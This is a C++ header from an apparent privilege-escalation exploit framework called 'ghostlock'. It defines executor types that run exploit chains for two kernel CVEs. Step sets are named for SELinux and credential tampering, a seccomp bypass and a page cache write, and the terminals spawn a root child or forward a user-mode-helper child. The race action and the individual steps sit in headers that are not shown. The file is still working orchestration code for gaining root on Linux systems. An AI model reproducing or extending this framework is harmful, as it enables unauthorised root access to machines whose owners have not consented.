#pragma once
/** @file pipeline/executors.hpp
 *  The three wired paths, each a type that asserts which path it is.
 *
 *  The catalogue says what a selection means; this file says what it runs. One type per wired
 *  dispatch target, so the composition is fixed at compile time and a mismatch is a build error
 *  rather than a run that quietly does something else. That is the rule the catalogue states in its
 *  own comment: every Pipeline asserts its target at compile time.
 *
 *  Each executor is thin on purpose. The steps are walked by the runner the backend already has, the
 *  work of one step is the action's, and the terminal is the terminal layer's. What an executor adds
 *  is only the claim: this type is that combination, and nothing here decides which selection is
 *  allowed -- the plan gate does that, and it already asks whether an executor is available.
 *
 *  The executor is not required to have any particular interface by the composition root, which only
 *  stores the handle and hosts the window. The interface below is therefore what a caller needs, and
 *  the only caller is the entry.
 */
#include <cstddef>
#include <cstdint>
#include <string_view>

#include "backend/cve_2026_43499/steps/action.hpp"
#include "backend/cve_2026_43499/steps/step_runner.hpp"
#include "contract/chain_catalog.hpp"
#include "contract/step_catalog.hpp"
#include "pipeline/component_catalog.hpp"

namespace ghostlock::pipeline {
    /** What running a path did: the runner's own report, plus the terminal's verdict. */
    struct PathRun final {
        /** True only when every step ran and the terminal finished. */
        bool ok = false;
        /** The runner's report, so a caller can name the step that stopped it. */
        backend::cve_2026_43499::steps::StepRun steps{};
        /** Whether the terminal finished, when the terminal is what this path ends in. */
        bool terminal_done = false;
    };

    /**
     *  The privilege chain that includes the seccomp step.
     *
     *  Its set is selinux_cred_seccomp and its terminal is the rooted child, which is the
     *  combination the catalogue lists as cve_2026_43499 with the longer sequence.
     */
    template <class Action = backend::cve_2026_43499::steps::RaceAction<>>
    class Cve43499W1W3_RootChild final {
      public:
        static constexpr DispatchTarget kTarget = DispatchTarget::Cve43499W1W3_RootChild;
        static constexpr std::string_view kBackend = "cve_2026_43499";
        static constexpr std::string_view kStepSet = "selinux_cred_seccomp";
        static constexpr std::string_view kTerminal = "root_child";

        Cve43499W1W3_RootChild(Action &action) noexcept : action_(&action) {}

        /** Run the whole set through the action. The runner stops at the first failing step. */
        [[nodiscard]] PathRun run() noexcept {
            PathRun out{};
            const contract::StepSetOrder *order = contract::step_set_order(kStepSet);
            if (order == nullptr) {
                return out;
            }
            out.steps = backend::cve_2026_43499::steps::run_step_set(*order, *action_);
            out.ok = out.steps.ok;
            return out;
        }

      private:
        Action *action_ = nullptr;
    };

    /** The same chain without the seccomp step: the combination the catalogue lists as W1W2. */
    template <class Action = backend::cve_2026_43499::steps::RaceAction<>>
    class Cve43499W1W2_RootChild final {
      public:
        static constexpr DispatchTarget kTarget = DispatchTarget::Cve43499W1W2_RootChild;
        static constexpr std::string_view kBackend = "cve_2026_43499";
        static constexpr std::string_view kStepSet = "selinux_cred";
        static constexpr std::string_view kTerminal = "root_child";

        Cve43499W1W2_RootChild(Action &action) noexcept : action_(&action) {}

        [[nodiscard]] PathRun run() noexcept {
            PathRun out{};
            const contract::StepSetOrder *order = contract::step_set_order(kStepSet);
            if (order == nullptr) {
                return out;
            }
            out.steps = backend::cve_2026_43499::steps::run_step_set(*order, *action_);
            out.ok = out.steps.ok;
            return out;
        }

      private:
        Action *action_ = nullptr;
    };

    /** The page cache write, which is one step and ends by handing the child forward. */
    template <class Action = backend::cve_2026_43499::steps::RaceAction<>>
    class Cve43284PageCache_UmhForward final {
      public:
        static constexpr DispatchTarget kTarget = DispatchTarget::Cve43284PageCache_UmhForward;
        static constexpr std::string_view kBackend = "cve_2026_43284";
        static constexpr std::string_view kStepSet = "pagecache";
        static constexpr std::string_view kTerminal = "umh_forward";

        Cve43284PageCache_UmhForward(Action &action) noexcept : action_(&action) {}

        [[nodiscard]] PathRun run() noexcept {
            PathRun out{};
            const contract::StepSetOrder *order = contract::step_set_order(kStepSet);
            if (order == nullptr) {
                return out;
            }
            out.steps = backend::cve_2026_43499::steps::run_step_set(*order, *action_);
            out.ok = out.steps.ok;
            return out;
        }

      private:
        Action *action_ = nullptr;
    };

    /* Each executor is the combination its name says. The target value is the one the catalogue
     * gives for that name, and the three tokens are the ones a chain row carries, so a rename in
     * either authority stops this build instead of drifting. */
    static_assert(Cve43499W1W3_RootChild<>::kTarget == DispatchTarget::Cve43499W1W3_RootChild,
                  "the longer chain is the W1W3 target");
    static_assert(Cve43499W1W2_RootChild<>::kTarget == DispatchTarget::Cve43499W1W2_RootChild,
                  "the shorter chain is the W1W2 target");
    static_assert(Cve43284PageCache_UmhForward<>::kTarget == DispatchTarget::Cve43284PageCache_UmhForward,
                  "the page cache write is the forward target");
    static_assert(Cve43499W1W3_RootChild<>::kStepSet != Cve43499W1W2_RootChild<>::kStepSet,
                  "the two chains are different step sets, which is their whole difference");
}  // namespace ghostlock::pipeline
